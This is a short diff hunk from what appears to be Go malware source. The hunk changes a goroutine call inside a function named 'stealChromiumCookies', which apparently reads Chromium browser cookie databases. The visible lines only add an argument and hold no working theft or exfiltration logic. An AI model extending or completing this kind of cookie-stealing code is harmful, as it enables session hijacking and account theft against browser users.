@@ -229,7 +229,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 				return
 			}
 			ch <- queryResult{buf.String(), ""}
-		}(dbPath)
+		}(dbPath, copyOk)
 
 		select {
 		case res := <-ch:
